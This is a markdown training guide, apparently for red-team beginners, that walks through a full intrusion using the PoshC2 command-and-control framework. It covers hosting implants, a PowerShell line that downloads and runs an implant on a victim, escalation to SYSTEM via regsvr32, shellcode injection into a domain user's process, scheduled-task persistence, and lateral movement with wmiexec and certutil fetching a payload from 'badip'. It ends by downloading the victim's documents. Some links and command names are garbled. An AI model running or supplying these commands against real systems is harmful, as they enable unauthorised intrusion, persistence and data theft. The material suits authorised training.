# CTE-For-Monkeys

- Running Poshc2 
	- Set up
	- tool familiarization 
		- hosting payload
		- file upload 
		- host enumeration 
		- user escalation
		- persistence / scripting
		- later movement
        - file download
- living of the land ( windows )
	- file downloads 
	- file (payload) execution 
- powershell 
	- user enumeration 
	- domain enumeration 
	- scripting


# Running PoshC2

Create a new project:

```
posh-project -n <project-name>
```

Projects can be switched to or listed using this script:
```
[*] Usage: posh-project -n <new-project-name>
[*] Usage: posh-project -s <project-to-switch-to>
[*] Usage: posh-project -l (lists projects)
[*] Usage: posh-project -d <project-to-delete>
[*] Usage: posh-project -c (shows current project)
```
Edit the configuration for your project:
```
posh-config
```
Edit `payloadcoms` to your ip  
Also edit Bindport form 443 to 80

Launch the PoshC2 server:
```
posh-server
```

Alternatively start it as a service:
```
posh-service
```
Separately, run the ImplantHandler for interacting with implants:
```
posh -u <username>
```

For more on `Poshc2` github like [here](https://apple.stackexchange.com/questions/254380/why-am-i-getting-an-invalid-active-developer-path-when-attempting-to-use-git-a) 

# Host Payloads 

The PoshC2 Implant Types can be summarized as:
* PS - PowerShell Implant.
* C# - C# Implant that does not use System.Management.Automation.dll.
* PY - Python Implant.
* PB - PBind

In the ImplantHandler run file upload command 
```
add-hosted-file
```

Host file options 
```
file location > /var/poshc2/YourProjectName/payloads/Sharp_v4_dropper_x64.exe
file uri > /en-us/readme.md
file MIME type > text/html
Base64 > n
```

View all hosted files by running
```
show-hosted-files
```

# Download Payload on Victim 

For testing lets downloading using powershell on victim machine using a basic user
```powershell
iwr -uri http://<YouripOrDomian>/HostedUriString -outfile C:\windows\temp\bad.exe; C:\windows\temp\bad.exe
```

Interact with implant by typeing `1` in ImplantHandler

# User Escalation

Check for running process 
```ps 
ps
```
> As a basic user you'll only be able to see anything ran under your own context. 

Lets escalate to system through execution  

Upload a the dll to the machine 
```ps
> upload-file 
> /var/poshc2/projetname/payloads/Sharp_v4_x64.dll
> location C:\windows\temp\updater.dll 
```

Execute dll using local windows binaries 
```ps
sharpps regserv32 C:\windows\temp\updater.dll
``` 
> For more on native window binaries look [here](https://lolbas-project.github.io/)

After execution you should see a system level beacon return in ImplantHandler  

Once you are system you can Enumerate for other users on the box with domain access. 
```ps
ps
```

Search for any user process being ran as a domain user, to inject into

```ps
inject-shellcode <PID> 
```
```ps
<name_of_shellcode.bin>
```

Checking your ImplantHandler you should see a new beacon running in the context of said user.

As a domain user you can now run domain level commands, you can check your groups and privileges 
``` 
sharpps net user <domain username>
```

# Persistence and Scripting 

Now to maintain our domain user privilege lets create a .ps1 script to set persistence using registry keys  

On your attack box with the editor of your choice copy the following 
```ps
$payloadpath = "C:\windows\temp\bad.exe"
$taskname = "Test Updater"
$tskdescription = "This task updates things."
$action = New-ScheduledTaskAction -Execute $payloadpath
$days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
$trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 8am
Register-ScheduledTask -Action $action -Trigger $trigger -Taskname $taskname -Description $tskdescription
```
> Learn more about powershell `New-ScheduledTaskTrigger` [here](https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/new-scheduledtask?view=windowsserver2022-ps)

Save your pslo script as bad.ps1 in /home/parrot/desktop/bad.ps1

Lets run the .ps1
```
pslo /home/parrot/desktop/bad.ps1
```

You should see your scheduled task name appear for confirmation 

# Lateral Movement 

Now lets run a `sharpview` to enumerate the network to conduct lateral movement
```
sharpview 
```
> Read more on sharpview [here](https://academy.hackthebox.com/course/preview/active-directory-powerview/powerviewsharpview-overview--usage)

We can us the enumeration script to identify the next workstation to laterally move to 

```
resolveip <127.0.0.1>
```

Lets host a new payload 
```
add-hosted-file
```

Host file opttions 
```
file location > /var/poshc2/projectname/payloads/Sharp_v4_dropper_x64.exe
file uri > /verify
file MIME type > text/html
Base64 > n
```

Run wimc to get download and execution of hosted payload
```
wmiexec <127.0.0.1> <domain> <username> password=asdsa "cmd /c certutil.exe -urlcache -split -f http://badip/verify C:\windows\downloads\bad2.exe && C:\windows\downloads\bad2.exe"
```

In ImplantHandler interact with the new payload 

Lets run a built in host enumeration script 
```
seatbelt
```
Take some time to look at the differnet feilds, look into any that you dont recognize.

In the new payload handler lets navigate to the `documents` folder 
```
cd C:\users\username\documents
```

lets see what documents we can find 
```
ls
```

Now lets download some files 
```
download-file <filename>
```

Congratulations you have ran through your first OPPLAN, check [here](poshC2_help_v8.md) for the help list for poshc2 and other commands you can run.

Things to lookup and learn: 
- [ ] MIME types
- [ ] Windows 10 privilege escalation 
- [ ]   

# Resources 
[PoshC2 Documentation](https://poshc2.readthedocs.io/_/downloads/en/latest/pdf/)